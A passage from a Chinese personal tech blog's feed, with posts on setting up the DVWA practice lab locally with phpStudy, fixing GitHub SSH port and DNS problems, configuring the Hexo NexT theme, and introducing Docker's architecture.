<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://blog.csdn.net/wota5037/article/details/81872836?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4-81872836-blog-72813870.235%5Ev38%5Epc_relevant_sort_base2&spm=1001.2101.3001.4242.3&utm_relevant_index=7">git push 一直卡住</a></p>
<p>[2] <a href="https://blog.csdn.net/ouyang_peng/article/details/81431208">【Git 学习】解决 git push 操作的时候出错，提示 error: unpack failed: unable to create temporary object directory</a></p>
<p>[3] <a href="https://blog.csdn.net/Hjingeng/article/details/105216116">浅谈 linux 中&#x2F;dev&#x2F;vda1 文件满了解决方法</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA-Web渗透之搭建靶场</title>
    <url>/2024/01/26/20240126-DVWA-Web%E6%B8%97%E9%80%8F%E4%B9%8B%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<p>Damn Vulnerable Web Application (DVWA)(译注：可以直译为：”该死的”不安全Web应用程序)，是一个编码差的、易受攻击的 PHP&#x2F;MySQL Web应用程序。 它的主要目的是帮助信息安全专业人员在合法的环境中，练习技能和测试工具，帮助 Web 开发人员更好地了解如何加强 Web 应用程序的安全性，并帮助学生和教师在可控的教学环境中了解和学习 Web 安全技术。</p>
<p><img src="https://cdn.huatree.top/image-20240127005708655.png" alt="image-20240127005708655"></p>
<span id="more"></span>

<h2 id="搭建DVWA的过程"><a href="#搭建DVWA的过程" class="headerlink" title="搭建DVWA的过程"></a>搭建DVWA的过程</h2><p>由于DVWA是用PHP语言写的安全测试平台，所以我们先要创建一个PHP开发集成环境。我们可以采用最简单的方法，只要安装上phpStudy，就安装了PHP开发集成环境。</p>
<p>搭建环境：win 11平台（其他环境符合code运行要求的也可以）</p>
<p>具体步骤如下：</p>
<h3 id="准备DVWA"><a href="#准备DVWA" class="headerlink" title="准备DVWA"></a>准备DVWA</h3><p>DVWA下载网址(已经失效)：<a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a></p>
<p>虽然有各种版本的 DVWA，但唯一受支持的版本是来自官方 GitHub 存储仓库（repository）的最新源码。 你可以从 repo 中克隆它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/digininja/DVWA.git</span><br><span class="line"><span class="comment"># ssh (快一点)</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:digininja/DVWA.git</span><br></pre></td></tr></table></figure>

<h3 id="安装phpStudy"><a href="#安装phpStudy" class="headerlink" title="安装phpStudy"></a>安装phpStudy</h3><p>phpStudy下载网址：<a href="https://www.xp.cn/">https://www.xp.cn/</a></p>
<p>安装路径这里选择E盘，MySQL的默认登录账号密码都为root；</p>
<p><a href="https://www.xp.cn/phpstudy-v8/">官方使用手册</a></p>
<p><strong>检查默认站点</strong></p>
<p>启动Apache和MySQL</p>
<p><img src="https://cdn.huatree.top/image-20240126144424508.png" alt="image-20240126144424508"></p>
<p>这里，启动MySQL是可能会失败：启动后会自动关闭。可能原因，是之前有安装过MySQL，需删掉注册表中的记录。</p>
<p>检查MySQL服务是否正在运行，如果是，需要先关闭，Windows系统中，<code>win + R</code>输入：<code>services.msc</code>打开本地服务列表，找到MySQL，停止服务。</p>
<p>Windows系统中，管理员权限打开CMD，执行下面的命令彻底删除MySQL服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sc delete mysql</span><br></pre></td></tr></table></figure>

<p>在浏览器中输入localhost或者127.0.01，站点创建成功，这表明安装成功</p>
<p><img src="https://cdn.huatree.top/image-20240126144136574.png" alt="image-20240126144136574"></p>
<h3 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h3><p>将github上克隆的DVWA文件夹复制到phpStudy指定的默认站点路径下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">E:\phpstudy_pro\WWW</span><br></pre></td></tr></table></figure>

<p>双击即可定位到该路径。</p>
<p><img src="https://cdn.huatree.top/image-20240126145607521.png" alt="image-20240126145607521"></p>
<p><strong>修改DVWA的数据库密码</strong></p>
<p>选中E:\phpStudy\WWW\DVWA-master\config\config.inc.php.dist文件，去掉后缀.dist；</p>
<p>然后修改config.inc.php文件内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_user&#x27;</span> ] = <span class="string">&#x27;dvwa&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;p@ssw0rd&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>改为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_user&#x27;</span> ] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>保存并关闭该文件。</p>
<p><strong>访问DVWA站点</strong></p>
<p>在浏览器中输入localhost:80&#x2F; DVWA&#x2F;setup.php，会进入一个网页。</p>
<p>访问的过程中可能会出现请求的页面不存在，需更改目录权限。</p>
<p><img src="https://cdn.huatree.top/image-20240126150541481.png" alt="image-20240126150541481"></p>
<p>win11系统可以这样操作赋予DVWA目录权限，把WWW下的DVWA目录拖拽到打开的VSCode，然后信任该目录，再次刷新访问localhost:80&#x2F; DVWA，成功了来到了DVWA页面</p>
<p><img src="https://cdn.huatree.top/image-20240126151207423.png" alt="image-20240126151207423"></p>
<p><strong>安装数据库</strong></p>
<p>点击该网页底部的”Create&#x2F;Reset Database”，就可以安装数据库。</p>
<p>查看数据库信息，需要数据库工具，这里选择的MySQL管理工具为phpAdmin：</p>
<p><img src="https://cdn.huatree.top/image-20240126152423854.png" alt="image-20240126152423854"></p>
<p>安装好后点击管理，登录上面修改的数据库密码即可访问到如下页面：</p>
<p><img src="https://cdn.huatree.top/image-20240126152722656.png" alt="image-20240126152722656"></p>
<p><strong>登录页面</strong></p>
<p>安装完成后会自动跳转到登录界面。输入默认的用户名“admin”，密码”password“，就可以进入该网站平台，可以进行安全测试的实践了。</p>
<p><img src="https://cdn.huatree.top/image-20240126151818172.png" alt="image-20240126151818172"></p>
<p>登录成功后跳到默认index.php页面，表明已经成功了</p>
<p><img src="https://cdn.huatree.top/image-20240126151952004.png" alt="image-20240126151952004"></p>
<p>DVWA从搭建到部署到此结束了，后面就是各种破解渗透该网站啦。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>DVWA的目的是通过简单明了的界面来<strong>练习一些最常见的 Web 漏洞</strong>，所练习的漏洞具有<strong>不同的难度级别</strong>。 请注意，此软件<strong>存在提示和无提示的漏洞</strong>。 这是特意为止。 我们鼓励您依靠自己的能力尝试并发现尽可能多的安全问题。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://digi.ninja/">https://digi.ninja/</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>ssh链接github端口22被拒绝</title>
    <url>/2024/02/05/20240205-ssh%E9%93%BE%E6%8E%A5github%E7%AB%AF%E5%8F%A322%E8%A2%AB%E6%8B%92%E7%BB%9D/</url>
    <content><![CDATA[<p>如果你电脑上的git能在大部分地方进行同步，但是在某处地方的网络下无法同步，并且运行<code>git clone</code>，<code>git pull</code>或<code>git push</code>长久没有反映，最后出现<code>ssh: connect to host github.com port 22: Connection timed out</code>，很可能是你的网络供应商（比如广电网）在出口防火墙上屏蔽了22端口，这意味着你将无法访问其他主机的22端口。</p>
<span id="more"></span>

<h2 id="使用GitHub的443端口"><a href="#使用GitHub的443端口" class="headerlink" title="使用GitHub的443端口"></a>使用GitHub的443端口</h2><p>像往常一样，本地clone远程github仓库，突然会提示如下错误：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh: connect to host github.com port 22: Connection timed out.</span><br><span class="line">fatal: Could not <span class="built_in">read</span> from remote repository. </span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights and the repository exists.</span><br></pre></td></tr></table></figure>

<p>大意是22端口被拒接访问，对此，github提供了一种解决方案，允许你使用443端口进行ssh连接，因为443端口是访问https网站所必须的，大部分防火墙都会允许通过，但如果使用代理服务器可能产生干扰。</p>
<p>我们可以通过 <code>ssh -T</code> 测试，是否有成功提示，如果成功，则可以使用这个解决方案。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -T -p 443 git@ssh.github.com</span><br></pre></td></tr></table></figure>

<p>如果成功，接下来本地配置一下，让你每次ssh连接github都通过443端口。</p>
<p>在<code>.ssh/config</code>内，添加以下内容：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">Port 443</span><br><span class="line">User git</span><br></pre></td></tr></table></figure>

<p>Windows系统，可以在桌面空白处单击鼠标右键，选择<code>Git Bash here</code>，然后在窗口中输入<code>ll -d ~/.ssh</code>也可以查询到<code>.ssh目录</code>的位置。如果<code>~/.ssh</code>目录下没有config文件，新建一个即可。</p>
<p>修改完<code>~/.ssh/config</code>文件后，使用<code>ssh -T git@github.com</code>来测试和GitHub的网络通信是否正常，如果提示<code>Hi xxxxx! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</code> 就表示一切正常了。</p>
<p><strong>这个方案有效的前提是</strong>：执行命令<code>ssh -T -p 443 git@ssh.github.com</code>后不再提示<code>connection refused</code>，所以要尝试这个方案的小伙伴先执行这条命令测试下。</p>
<h2 id="修改hosts文件"><a href="#修改hosts文件" class="headerlink" title="修改hosts文件"></a>修改hosts文件</h2><p>既然和GitHub建立ssh连接的时候提示<code>connection refused</code>，那我们就详细看看建立ssh连接的过程中发生了什么，可以使用<code>ssh -v</code>命令，<code>-v</code>表示verbose，会打出详细日志。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ssh -vT git@github.com</span><br><span class="line">OpenSSH_9.0p1, OpenSSL 1.1.1o  3 May 2022</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: Connecting to github.com [::1] port 22.</span><br><span class="line">debug1: connect to address ::1 port 22: Connection refused</span><br><span class="line">debug1: Connecting to github.com [127.0.0.1] port 22.</span><br><span class="line">debug1: connect to address 127.0.0.1 port 22: Connection refused</span><br><span class="line">ssh: connect to host github.com port 22: Connection refused</span><br></pre></td></tr></table></figure>

<p>从上面的信息马上就发现了诡异的地方，连接<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a>的地址居然是<code>::1</code>和<code>127.0.0.1</code>。前者是IPV6的localhost地址，后者是IPV4的localhost地址。</p>
<p>到这里问题就很明确了，是DNS解析出问题了，导致<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a>域名被解析成了localhost的ip地址，就自然连不上GitHub了。</p>
<p>Windows下执行<code>ipconfig /flushdns</code> 清楚DNS缓存后也没用，最后修改hosts文件，增加一条github.com的域名映射搞定。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">20.205.243.166 github.com</span><br></pre></td></tr></table></figure>

<p>查找<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a>的ip地址可以使用<a href="https://link.zhihu.com/?target=https://www.ipaddress.com/">https://www.ipaddress.com/</a>来查询，也可以使用<code>nslookup</code>命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup github.com 8.8.8.8</span><br></pre></td></tr></table></figure>

<p><code>nslookup</code>是域名解析工具，<code>8.8.8.8</code>是Google的DNS服务器地址。直接使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup github.com</span><br></pre></td></tr></table></figure>

<p>就会使用本机已经设置好的DNS服务器进行域名解析，<code>ipconfig /all</code>可以查看本机DNS服务器地址。</p>
<p>这个问题其实就是DNS解析被污染了，有2种可能：</p>
<ul>
<li>DNS解析被运营商劫持了</li>
<li>使用了科学上网工具</li>
</ul>
<h2 id="git-pull或git-push出现Permission-denied-publickey"><a href="#git-pull或git-push出现Permission-denied-publickey" class="headerlink" title="git pull或git push出现Permission denied (publickey)"></a>git pull或git push出现Permission denied (publickey)</h2><p>先检测下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">git@github.com: Permission denied (publickey).</span><br></pre></td></tr></table></figure>

<p>可能SSH密钥过期了，去<a href="https://docs.github.com/zh/authentication/troubleshooting-ssh/deleted-or-missing-ssh-keys">github官方文档</a>查下，真相了：作为安全预防措施，GitHub 会自动删除一年内未使用过的 SSH 密钥。</p>
<p>通过命令 ssh-keygen 生成 SSH Key</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure>

<p>中间通过三次<strong>回车键</strong>确定</p>
<p>查看生成的 SSH 公钥和私钥</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> ~/.ssh/</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">id_ed25519  id_ed25519.pub</span><br></pre></td></tr></table></figure>

<ul>
<li>私钥文件 <code>id_ed25519</code></li>
<li>公钥文件 <code>id_ed25519.pub</code></li>
</ul>
<p>复制公钥文件内容到github的设置中，<a href="https://docs.github.com/zh/authentication/connecting-to-github-with-ssh/adding-a-new-ssh-key-to-your-github-account#adding-a-new-ssh-key-to-your-account">详见</a>。</p>
<p>测试SSH连接，<a href="https://docs.github.com/zh/authentication/connecting-to-github-with-ssh/testing-your-ssh-connection">详见</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://segmentfault.com/a/1190000040896781">解决 ssh: connect to host github.com port 22: Connection timed out</a></p>
<p>[2] <a href="https://zhuanlan.zhihu.com/p/521340971">坑：ssh: connect to host github.com port 22: Connection refused</a></p>
<p>[3] <a href="https://docs.github.com/zh/authentication">GitHub 文档 - 身份验证</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>NexT主题配置</title>
    <url>/2023/09/01/20230901-NexT%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>本文基于<em>hexo-theme-next</em>主题插件配置的扫盲分享，节省你走弯路的时间。</p>
<span id="more"></span>

<h2 id="链接站内文章"><a href="#链接站内文章" class="headerlink" title="链接站内文章"></a>链接站内文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% post_link 文章对应的文件名 %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="指定站点设置的年份"><a href="#指定站点设置的年份" class="headerlink" title="指定站点设置的年份"></a>指定站点设置的年份</h2><p>配置<code>_config.next.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="comment"># Specify the year when the site was setup. If not defined, current year will be used.</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2021</span></span><br></pre></td></tr></table></figure>

<h2 id="添加本地搜索服务"><a href="#添加本地搜索服务" class="headerlink" title="添加本地搜索服务"></a>添加本地搜索服务</h2><p>安装npm包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn add hexo-generator-searchdb</span><br></pre></td></tr></table></figure>

<p>配置<code>_config.next.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>配置<code>_config.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Local Search</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>

<h2 id="开启不蒜子统计"><a href="#开启不蒜子统计" class="headerlink" title="开启不蒜子统计"></a>开启不蒜子统计</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="主题自定义样式"><a href="#主题自定义样式" class="headerlink" title="主题自定义样式"></a>主题自定义样式</h2><p>配置<code>_config.next.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line"> <span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>

<p><code>source/_data/styles.styl</code>为样式文件路径</p>
<h2 id="添加评论系统gitalk"><a href="#添加评论系统gitalk" class="headerlink" title="添加评论系统gitalk"></a>添加评论系统gitalk</h2><p><a href="https://blog.csdn.net/a171232886/article/details/121206824">详见</a></p>
<h2 id="站点页脚备案信息"><a href="#站点页脚备案信息" class="headerlink" title="站点页脚备案信息"></a>站点页脚备案信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">footer:  </span><br><span class="line"> beian:</span><br><span class="line">    enable: true</span><br><span class="line">    icp: 蜀ICP备2022016364号-1</span><br></pre></td></tr></table></figure>

<h2 id="配置最近文章"><a href="#配置最近文章" class="headerlink" title="配置最近文章"></a>配置最近文章</h2><p><code>source/_data</code>路径下新建sidebar.njk文件，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;# RecentPosts #&#125;</span><br><span class="line">&#123;% if theme.recent_posts %&#125;</span><br><span class="line">  &lt;div class=&quot;links-of-recent-posts site-overview-item animated&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;links-of-recent-posts-title&quot;&gt;</span><br><span class="line">      &#123;% if theme.recent_posts.icon %&#125;</span><br><span class="line">      &lt;i class=&quot;&#123;&#123; theme.recent_posts.icon &#125;&#125; fa-fw&quot;&gt;&lt;/i&gt;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">      &#123;&#123; theme.recent_posts.title &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;ul class=&quot;links-of-recent-posts-list&quot;&gt;</span><br><span class="line">      &#123;% set posts = site.posts.sort(&#x27;date&#x27;, &#x27;desc&#x27;).toArray() %&#125;</span><br><span class="line">      &#123;% for post in posts.slice(&#x27;0&#x27;, theme.recent_posts.max_count) %&#125;</span><br><span class="line">        &lt;li class=&quot;links-of-recent-posts-item&quot;&gt;</span><br><span class="line">          &#123;&#123; next_url(post.path, post.title, &#123;title: post.path&#125;) &#125;&#125;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">      &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p><code>source/_data/styles.styl</code>增加样式：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 近期文章</span></span><br><span class="line"><span class="selector-class">.links-of-recent-posts</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.8125em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.links-of-recent-posts-title</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.03em</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">600</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.links-of-recent-posts-list</span> &#123;</span><br><span class="line">  <span class="attribute">list-style</span>: none;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置<code>_config.next.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line"> <span class="attr">sidebar:</span> <span class="string">source/_data/sidebar.njk</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 最近文章</span></span><br><span class="line"><span class="attr">recent_posts:</span></span><br><span class="line"><span class="comment"># 块标题</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">最近文章</span></span><br><span class="line"><span class="comment"># 图标</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-history</span></span><br><span class="line"><span class="comment"># 最多多少文章链接</span></span><br><span class="line">  <span class="attr">max_count:</span> <span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>以更新时间倒叙排序，修改<code>source/_data/sidebar.njk</code>文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;# RecentPosts #&#125;</span><br><span class="line">&#123;% if theme.recent_posts %&#125;</span><br><span class="line">  &lt;div class=&quot;links-of-recent-posts site-overview-item animated&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;links-of-recent-posts-title&quot;&gt;</span><br><span class="line">      &#123;% if theme.recent_posts.icon %&#125;</span><br><span class="line">      &lt;i class=&quot;&#123;&#123; theme.recent_posts.icon &#125;&#125; fa-fw&quot;&gt;&lt;/i&gt;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">      &#123;&#123; theme.recent_posts.title &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;ul class=&quot;links-of-recent-posts-list&quot;&gt;</span><br><span class="line">      &#123;% set posts = site.posts.sort(&#x27;updated&#x27;, &#x27;desc&#x27;).toArray() %&#125;</span><br><span class="line">      &#123;% for post in posts.slice(&#x27;0&#x27;, theme.recent_posts.max_count) %&#125;</span><br><span class="line">        &lt;li class=&quot;links-of-recent-posts-item&quot;&gt;</span><br><span class="line">          &#123;&#123; next_url(post.path, post.title, &#123;title: post.path&#125;) &#125;&#125;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">      &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="http://theme-next.iissnan.com/">NexT 官方文档</a></p>
<p>[2] <a href="https://theme-next.js.org/docs/">NexT Theme for Hexo Docs</a></p>
<p>[3] <a href="https://github.com/iissnan/hexo-theme-next/issues/978">请问博主，next或者hexo，链接站内文章的方法？</a></p>
<p>[4] <a href="https://gitalk.github.io/">GITALK - 一个基于 Github Issue 和 Preact 开发的评论插件</a></p>
<p>[5] <a href="https://nunjucks.bootcss.com/index.html">Nunjucks</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker.1-了解</title>
    <url>/2022/05/11/20220511-Docker.1-%E4%BA%86%E8%A7%A3/</url>
    <content><![CDATA[<p>Docker 是一个用于开发、发布和运行应用程序的开放平台。Docker 使你能够将应用程序与基础设施分离，以便你可以快速交付软件。借助 Docker，你可以像管理应用程序一样管理基础设施。通过利用 Docker 的方法来快速交付、测试和部署代码，你可以显著减少编写代码和在生产中运行代码之间的延迟。</p>
<span id="more"></span>

<h2 id="Docker-平台"><a href="#Docker-平台" class="headerlink" title="Docker 平台"></a>Docker 平台</h2><p>Docker 提供了在称为容器的松散隔离环境中打包和运行应用程序的能力。隔离和安全性允许你在给定主机上同时运行多个容器。容器是轻量级的，包含运行应用程序所需的一切，因此你不需要依赖主机上当前安装的内容。你可以在工作时轻松共享容器，并确保与你共享的每个人都获得以相同方式工作的相同容器。</p>
<p>Docker 提供了工具和平台来管理容器的生命周期：</p>
<ul>
<li>使用容器开发你的应用程序及其支持组件。</li>
<li>容器成为分发和测试应用程序的单元。</li>
<li>准备就绪后，将应用程序作为容器或编排服务部署到生产环境中。无论你的生产环境是本地数据中心、云提供商还是两者的混合，这都是一样的。</li>
</ul>
<h2 id="我们可以用-Docker-做什么"><a href="#我们可以用-Docker-做什么" class="headerlink" title="我们可以用 Docker 做什么"></a>我们可以用 Docker 做什么</h2><h3 id="快速、一致地交付你的应用程序"><a href="#快速、一致地交付你的应用程序" class="headerlink" title="快速、一致地交付你的应用程序"></a>快速、一致地交付你的应用程序</h3><p>Docker 允许开发人员使用提供应用程序和服务的本地容器在标准化环境中工作，从而简化了开发生命周期。容器非常适合持续集成和持续交付 (CI&#x2F;CD) 工作流程。</p>
<p>考虑以下示例场景：</p>
<ul>
<li>你的开发人员在本地编写代码并使用 Docker 容器与同事共享他们的工作。</li>
<li>他们使用 Docker 将应用程序推送到测试环境中并执行自动和手动测试。</li>
<li>当开发人员发现错误时，可以在开发环境中修复它们，并将其重新部署到测试环境中进行测试和验证。</li>
<li>测试完成后，向客户提供修复就像将更新的镜像推送到生产环境一样简单。</li>
</ul>
<h3 id="响应式部署和扩展"><a href="#响应式部署和扩展" class="headerlink" title="响应式部署和扩展"></a>响应式部署和扩展</h3><p>Docker 基于容器的平台支持高度可移植的工作负载。Docker 容器可以在开发人员的本地笔记本电脑、数据中心的物理机或虚拟机、云提供商或混合环境中运行。</p>
<p>Docker 的可移植性和轻量级特性还使得动态管理工作负载、根据业务需求几乎实时地扩展或拆除应用程序和服务变得很容易。</p>
<h3 id="在相同硬件上运行更多工作负载"><a href="#在相同硬件上运行更多工作负载" class="headerlink" title="在相同硬件上运行更多工作负载"></a>在相同硬件上运行更多工作负载</h3><p>Docker 轻量且快速。它为基于虚拟机管理程序的虚拟机提供了可行且经济高效的替代方案，因此你可以利用更多服务器容量来实现业务目标。Docker 非常适合高密度环境以及需要用更少的资源做更多事情的中小型部署。</p>
<h2 id="Docker-架构"><a href="#Docker-架构" class="headerlink" title="Docker 架构"></a>Docker 架构</h2><p>Docker 使用 C&#x2F;S（客户端-服务器）架构。Docker<em>客户端</em>与 Docker<em>守护进程</em>通信，后者负责构建、运行和分发 Docker 容器的繁重工作。Docker 客户端和守护进程<em>可以</em> 在同一系统上运行，也可以将 Docker 客户端连接到远程 Docker 守护进程。Docker 客户端和守护进程使用 REST API 通过 UNIX 套接字或网络接口进行通信。另一个 Docker 客户端是 <strong>Docker Compose</strong>，它允许你使用由一组容器组成的应用程序。</p>
<p><img src="https://cdn.huatree.top/image-20230701140437279.png" alt="image-20230701140437279"></p>
<h3 id="Docker-守护进程"><a href="#Docker-守护进程" class="headerlink" title="Docker 守护进程"></a>Docker 守护进程</h3><p>Docker 守护进程 ( <code>dockerd</code>) 侦听 Docker API 请求并管理 Docker 对象，例如镜像、容器、网络和卷。守护进程还可以与其他守护进程通信来管理 Docker 服务。</p>
<h3 id="Docker-客户端"><a href="#Docker-客户端" class="headerlink" title="Docker 客户端"></a>Docker 客户端</h3><p>Docker 客户端 ( <code>docker</code>) 是许多 Docker 用户与 Docker 交互的主要方式。当你使用诸如<code>docker run</code>之类的命令时，客户端会将这些命令发送到<code>dockerd</code>，由后者执行这些命令。该<code>docker</code>命令使用 Docker API。Docker 客户端可以与多个守护进程通信。</p>
<h3 id="Docker-桌面"><a href="#Docker-桌面" class="headerlink" title="Docker 桌面"></a>Docker 桌面</h3><p>Docker Desktop 是一款适用于 Mac、Windows 或 Linux 环境的易于安装的应用程序，使你能够构建和共享容器化应用程序和微服务。Docker Desktop 包括 Docker 守护进程 ( <code>dockerd</code>)、Docker 客户端 ( <code>docker</code>)、Docker Compose、Docker Content Trust、Kubernetes 和 Credential Helper。有关更多信息，请参阅<a href="https://docs.docker.com/desktop/">Docker 桌面</a>。</p>
<h3 id="Docker-注册表"><a href="#Docker-注册表" class="headerlink" title="Docker 注册表"></a>Docker 注册表</h3><p>Docker<em>注册表</em>存储 Docker 镜像。Docker Hub 是任何人都可以使用的公共注册表，并且 Docker 默认配置为在 Docker Hub 上查找镜像。你甚至可以运行自己的私人注册表。</p>
<blockquote>
<p>跟 npm 一样，都用镜像源</p>
</blockquote>
<h3 id="Docker-对象"><a href="#Docker-对象" class="headerlink" title="Docker 对象"></a>Docker 对象</h3><h4 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h4><p>镜像是一个只读模板，包含创建 Docker 容器的说明<em>。</em>通常，一个镜像<em>基于</em>另一个镜像，并进行一些额外的自定义。例如，你可以构建一个基于该<code>ubuntu</code> 镜像的镜像，但会安装 Apache Web 服务器和你的应用程序，以及运行应用程序所需的配置详细信息。</p>
